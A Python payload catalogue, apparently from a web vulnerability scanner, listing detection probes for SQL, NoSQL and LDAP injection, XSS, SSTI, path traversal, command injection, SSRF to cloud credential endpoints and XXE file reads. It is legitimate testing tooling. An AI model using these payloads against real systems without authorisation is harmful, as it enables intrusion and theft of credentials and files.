"""Payload catalogue.

Payloads are grouped by vulnerability class and, where the class needs it, use
placeholders:

``{marker}``  a unique alphanumeric marker used to prove execution/reflection
``{delay}``   seconds to sleep for time-based detection
``{target}``  the callback/internal URL for SSRF probes
``{file}``    the file to read for path traversal

Every entry is non-destructive: no payload drops files, alters data or spawns a
persistent process. Verification payloads (used by the exploitation engine) are
kept in :mod:`candix.exploit.payloads` and are gated by the engagement scope.
"""

from __future__ import annotations

from typing import Iterable

PAYLOADS: dict[str, list[str]] = {
    # ------------------------------------------------------------------
    # SQL injection
    # ------------------------------------------------------------------
    "sqli_error": [
        "'",
        "\"",
        "`",
        "')",
        "\")",
        "';",
        "\";",
        "'--",
        "\"--",
        "'#",
        "')--",
        "')#",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND 1=CONVERT(int, @@version)--",
        "' AND extractvalue(1, concat(0x7e, version()))--",
        "' AND updatexml(1, concat(0x7e, version()), 1)--",
        "%27",
        "%27%20OR%201=1--",
        "\\'",
        "') OR ('1'='1",
        "') OR 1=1--",
        "1' UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1' ORDER BY 100--",
        "1' GROUP BY 1,2,3--",
        "'; WAITFOR DELAY '0:0:0'--",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(0))a)--",
        "admin'--",
        "admin'#",
        "' OR 'x'='x",
    ],
    "sqli_boolean": [
        "' AND '1'='1",
        "' AND '1'='2",
        "\" AND \"1\"=\"1",
        "\" AND \"1\"=\"2",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR 'a'='a",
        "' OR 'a'='b",
        ") AND (1=1",
        ") AND (1=2",
        "' AND ASCII(SUBSTRING((SELECT version()),1,1))>0--",
        "' AND ASCII(SUBSTRING((SELECT version()),1,1))<0--",
    ],
    "sqli_time": [
        "' AND SLEEP({delay})-- -",
        "' AND SLEEP({delay})#",
        "\" AND SLEEP({delay})-- -",
        "1' AND SLEEP({delay})-- -",
        "1 AND SLEEP({delay})",
        "') AND SLEEP({delay})-- -",
        "' OR SLEEP({delay})-- -",
        "' AND (SELECT {delay} FROM (SELECT SLEEP({delay}))x)-- -",
        "';SELECT SLEEP({delay})-- -",
        "' AND pg_sleep({delay})-- -",
        "\";SELECT pg_sleep({delay})-- -",
        "';WAITFOR DELAY '0:0:{delay}'-- -",
        "\";WAITFOR DELAY '0:0:{delay}'-- -",
        "1;WAITFOR DELAY '0:0:{delay}'-- -",
        "' AND dbms_pipe.receive_message(('a'),{delay})-- -",
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})-- -",
        "' AND randomblob(100000000)-- -",
        "' AND 1=(SELECT 1 FROM pg_sleep({delay}))-- -",
        "')) AND SLEEP({delay})-- -",
    ],
    "sqli_union": [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION ALL SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT 1,2,3-- -",
        "' UNION SELECT @@version,2,3-- -",
        "' UNION SELECT user(),2,3-- -",
        "\" UNION SELECT NULL-- -",
        "1 UNION SELECT NULL-- -",
        "-1 UNION SELECT 1,2,3-- -",
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        "' UNION SELECT load_file('/etc/passwd'),NULL-- -",
    ],
    "sqli_auth_bypass": [
        "admin'--",
        "admin'-- -",
        "admin'#",
        "admin' OR '1'='1",
        "admin' OR 1=1-- -",
        "' OR 1=1-- -",
        "' OR '1'='1'-- -",
        "user' OR 'x'='x",
        "') OR ('1'='1",
        "\" OR \"\"=\"",
        "admin\"--",
        "admin')--",
    ],
    # ------------------------------------------------------------------
    # Cross-site scripting
    # ------------------------------------------------------------------
    "xss_reflection": [
        "cdx{marker}",
        "<cdx{marker}>",
        "\"><cdx{marker}>",
        "'><cdx{marker}>",
        "\"cdx{marker}",
        "'cdx{marker}",
        "<cdx{marker} x=1>",
        "<script>cdx{marker}</script>",
    ],
    "xss_execution": [
        "<script>alert({marker})</script>",
        "<script>confirm({marker})</script>",
        "\"><script>alert({marker})</script>",
        "'><script>alert({marker})</script>",
        "<img src=x onerror=alert({marker})>",
        "<img src=x onerror=\"alert({marker})\">",
        "<svg/onload=alert({marker})>",
        "<svg onload=alert({marker})>",
        "<body onload=alert({marker})>",
        "<iframe src=javascript:alert({marker})>",
        "<input autofocus onfocus=alert({marker})>",
        "<details open ontoggle=alert({marker})>",
        "<math><mtext><script>alert({marker})</script>",
        "javascript:alert({marker})",
        "\" autofocus onfocus=\"alert({marker})",
        "' autofocus onfocus='alert({marker})",
        "<a href=javascript:alert({marker})>x</a>",
        "<scr<script>ipt>alert({marker})</scr</script>ipt>",
        "<SCRIPT>alert({marker})</SCRIPT>",
        "<img src=1 onerror=alert({marker})//>",
        "\"><img src=x onerror=alert({marker})>",
        "{{constructor.constructor('alert({marker})')()}}",
        "${alert({marker})}",
        "<svg><animate onbegin=alert({marker}) attributeName=x dur=1s>",
    ],
    "xss_polyglot": [
        "\"><script>alert({marker})</script>",
        "javascript:alert({marker})//",
        "'-alert({marker})-',",
        "\"onmouseover=\"alert({marker})",
        "<svg/onload=alert({marker})>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert({marker}) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert({marker})//>\\x3e",
    ],
    # ------------------------------------------------------------------
    # Server-side template injection
    # ------------------------------------------------------------------
    "ssti_probe": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",
        "{{7*7}}${7*7}",
        "@(7*7)",
        "*{7*7}",
        "{7*7}",
        "{{ 7 * 7 }}",
        "{{config}}",
        "{{self}}",
        "{{ ''.__class__ }}",
        "${7*7}",
        "#{7*7}",
        "{[7*7]}",
        "{{= 7*7}}",
        "${{7*7}}",
        "{{ '7'*7 }}",
    ],
    "ssti_expected": ["49", "7777777"],
    # ------------------------------------------------------------------
    # File inclusion / traversal
    # ------------------------------------------------------------------
    "lfi": [
        "etc/passwd",
        "/etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/etc/passwd%00",
        "/etc/passwd%00.html",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "C:\\Windows\\win.ini",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "%252e%252e%252fetc%252fpasswd",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
        "/etc/hosts",
        "/etc/hostname",
        "/var/log/apache2/access.log",
        "../../../../../../../../../../etc/passwd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "/static/../etc/passwd",
    ],
    "lfi_signatures": [
        "root:x:0:0",
        "root:*:0:0",
        "daemon:x:1:1",
        "[fonts]",
        "[extensions]",
        "PD9waHA",
        "PATH=",
        "localhost",
    ],
    # ------------------------------------------------------------------
    # Remote command execution
    # ------------------------------------------------------------------
    "rce": [
        ";echo {marker}",
        "|echo {marker}",
        "||echo {marker}",
        "&echo {marker}",
        "&&echo {marker}",
        "`echo {marker}`",
        "$(echo {marker})",
        "';echo {marker};'",
        "\";echo {marker};\"",
        "|echo${IFS}{marker}",
        ";echo${{{IFS}}}{marker}",
        "%0aecho%20{marker}",
        "%3Becho%20{marker}",
        "1;echo {marker}",
        "127.0.0.1;echo {marker}",
        "127.0.0.1|echo {marker}",
        "127.0.0.1$(echo {marker})",
        "localhost && echo {marker}",
        "a\necho {marker}",
        "\n echo {marker}",
        "|| ping -c 1 127.0.0.1 && echo {marker}",
        ";id",
        "|id",
        ";whoami",
        "$(whoami)",
        "`id`",
        ";uname -a",
    ],
    "rce_signatures": ["uid=", "gid=", "root", "www-data", "nt authority", "linux", "windows"],
    # ------------------------------------------------------------------
    # SSRF
    # ------------------------------------------------------------------
    "ssrf": [
        "http://{target}/",
        "https://{target}/",
        "//{target}/",
        "http://{target}@127.0.0.1/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:22/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://0177.0.0.1/",
        "http://2130706433/",
        "http://0x7f000001/",
        "http://127.1/",
        "http://127.0.0.1:8080/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://metadata.tencentyun.com/latest/meta-data/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/info",
        "ftp://127.0.0.1/",
        "ldap://127.0.0.1/",
        "http://{target}%23@127.0.0.1/",
        "http://127.0.0.1.nip.io/",
        "http://spoofed.burpcollaborator.net@127.0.0.1/",
    ],
    "ssrf_metadata_signatures": [
        "ami-",
        "instance-id",
        "iam/security-credentials",
        "computeMetadata",
        "metadata",
        "169.254.169.254",
        "AccessKeyId",
        "securityCredentials",
        "privateIp",
    ],
    # ------------------------------------------------------------------
    # XXE
    # ------------------------------------------------------------------
    "xxe": [
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://{target}/\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % p SYSTEM \"http://{target}/e.dtd\">%p;]><r/>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><r>&x;</r>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x \"cdx{marker}\">]><r>&x;</r>",
        "<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY x SYSTEM \"file:///c:/windows/win.ini\">]><r>&x;</r>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><r><![CDATA[<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>]]></r></soap:Body></soap:Envelope>",
        "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"expect://echo cdx{marker}\">]><r>&x;</r>",
    ],
    # ------------------------------------------------------------------
    # NoSQL / LDAP / XPath
    # ------------------------------------------------------------------
    "nosqli": [
        "{\"$ne\": null}",
        "{\"$gt\": \"\"}",
        "{\"$regex\": \".*\"}",
        "{\"$where\": \"1==1\"}",
        "{\"$or\": [{}]}",
        "' || '1'=='1",
        "' || 1==1 //",
        "\" || \"1\"==\"1",
        "true, $where: '1 == 1'",
        "{$ne: ''}",
        "admin' || 'a'=='a",
        "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
        "[$ne]=1",
        "[$gt]=",
        "{\"$gt\": \"\"}",
        "'%20||%20'1'=='1",
        "\\u0000",
        "{\"$nin\": []}",
        "';return true;$where: '1'=='1",
    ],
    "ldap": [
        "*",
        "*)(&",
        "*)(uid=*))(|(uid=*",
        "admin*",
        "admin*)((|userPassword=*)",
        "*()|&",
        "*))%00",
        "\\2a",
        "*)(objectClass=*",
        ")(cn=*",
        "*)(cn=*))(|(cn=*",
        "x' or '1'='1",
    ],
    "xpath": [
        "' or '1'='1",
        "\" or \"1\"=\"1",
        "' or 1=1 or ''='",
        "x' or name()='username' or 'x'='y",
        "' and count(/*)=1 and ''='",
        "' or \"1\"=\"1",
        "'] | //* | //*['",
        "' or contains(/*, 'a') or ''='",
    ],
    # ------------------------------------------------------------------
    # Header injections and redirects
    # ------------------------------------------------------------------
    "crlf": [
        "%0d%0aX-Candix: {marker}",
        "%0aX-Candix: {marker}",
        "\r\nX-Candix: {marker}",
        "\nX-Candix: {marker}",
        "%0d%0aSet-Cookie: cdx={marker}",
        "%E5%98%8A%E5%98%8DX-Candix: {marker}",
        "%0d%0a%0d%0a<html>cdx{marker}</html>",
        "foo%0d%0aX-Candix:{marker}",
        "%0d%0aLocation: /cdx{marker}",
        "\\r\\nX-Candix: {marker}",
    ],
    "open_redirect": [
        "https://example.org/",
        "//example.org/",
        "///example.org/",
        "/\\example.org/",
        "https:example.org/",
        "http://example.org/",
        "https://example.org/%2f..",
        "//example.org/%2f..",
        "/%09/example.org",
        "https://example.org#@target",
        "//example.org@target",
        "@example.org",
        "https://example.org\\@target",
        "http://example.org/?x=1",
        "////example.org",
        "https://example.org/%5c%5ctarget",
    ],
    # ------------------------------------------------------------------
    # Host header and cache
    # ------------------------------------------------------------------
    "host_header": [
        "127.0.0.1",
        "localhost",
        "169.254.169.254",
        "evil.example.org",
        "target.example.org",
        "127.0.0.1:80",
        "localhost:443",
        "evil.example.org:80",
        "x",
    ],
    "cache_buster_headers": [
        "X-Forwarded-Host",
        "X-Forwarded-Scheme",
        "X-Forwarded-Proto",
        "X-Original-URL",
        "X-Rewrite-URL",
        "X-HTTP-Method-Override",
        "X-Host",
        "Forwarded",
        "X-Forwarded-For",
        "CF-Connecting-IP",
        "True-Client-IP",
    ],
    # ------------------------------------------------------------------
    # GraphQL
    # ------------------------------------------------------------------
    "graphql_introspection": [
        "query { __schema { types { name fields { name } } } }",
        "query IntrospectionQuery { __schema { queryType { name } mutationType { name } } }",
        "{__typename}",
        "query { __type(name: \"User\") { name fields { name type { name } } } }",
    ],
    "graphql_suggestions": [
        "{ usr }",
        "{ user(id:1) { id } }",
        "query { a }",
        "mutation { login(user:\"admin\", pass:\"x\") { token } }",
    ],
    # ------------------------------------------------------------------
    # Authentication material
    # ------------------------------------------------------------------
    "jwt_weak_secrets": [
        "secret",
        "password",
        "changeme",
        "secretkey",
        "jwtsecret",
        "jwt_secret",
        "supersecret",
        "key",
        "test",
        "dev",
        "development",
        "private",
        "mysecretkey",
        "your-256-bit-secret",
        "s3cr3t",
        "123456",
        "admin",
        "candix",
        "todo",
        "default",
        "hs256",
        "signature",
        "token",
        "auth",
        "app",
        "application",
        "mysecret",
        "topsecret",
        "letmein",
        "qwerty",
        "secret123",
    ],
    "headers_injection": [
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Forwarded-For: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1",
        "X-Forwarded-Proto: https",
        "X-Real-IP: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "Client-IP: 127.0.0.1",
        "Forwarded: for=127.0.0.1;host=127.0.0.1;proto=https",
    ],
    # ------------------------------------------------------------------
    # Miscellaneous probes
    # ------------------------------------------------------------------
    "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "sqlmap/1.7.2#stable (https://sqlmap.org)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
        "curl/8.4.0",
        "python-requests/2.31.0",
        "Candix/0.1",
    ],
    "path_probe": [
        "/.git/config",
        "/.git/HEAD",
        "/.svn/entries",
        "/.hg/requires",
        "/.env",
        "/.env.local",
        "/.env.production",
        "/config.php.bak",
        "/index.php~",
        "/backup.zip",
        "/backup.tar.gz",
        "/db.sql",
        "/dump.sql",
        "/web.config",
        "/WEB-INF/web.xml",
        "/server-status",
        "/phpinfo.php",
        "/swagger.json",
        "/openapi.json",
        "/api-docs",
        "/graphql",
        "/.well-known/security.txt",
        "/actuator/health",
        "/actuator/env",
        "/metrics",
        "/debug",
        "/console",
        "/.DS_Store",
        "/crossdomain.xml",
        "/package.json",
        "/composer.json",
    ],
}


def get_payloads(name: str) -> list[str]:
    """Return a copy of a payload family; unknown families raise ``KeyError``."""

    if name not in PAYLOADS:
        raise KeyError(f"unknown payload family: {name}")
    return list(PAYLOADS[name])


def render_payload(template: str, *, marker: str = "", delay: int = 5, target: str = "", file: str = "") -> str:
    """Substitute catalogue placeholders.

    ``str.format_map`` is not used directly because payloads legitimately
    contain braces (SSTI, JSON bodies), which would raise.
    """

    result = template
    result = result.replace("{marker}", marker)
    result = result.replace("{delay}", str(delay))
    result = result.replace("{target}", target)
    result = result.replace("{file}", file)
    return result


def families() -> list[str]:
    return sorted(PAYLOADS)


def iter_payloads(names: Iterable[str], *, limit: int | None = None) -> list[str]:
    collected: list[str] = []
    for name in names:
        collected.extend(get_payloads(name))
    if limit is not None:
        return collected[:limit]
    return collected


def payload_count() -> int:
    return sum(len(items) for items in PAYLOADS.values())
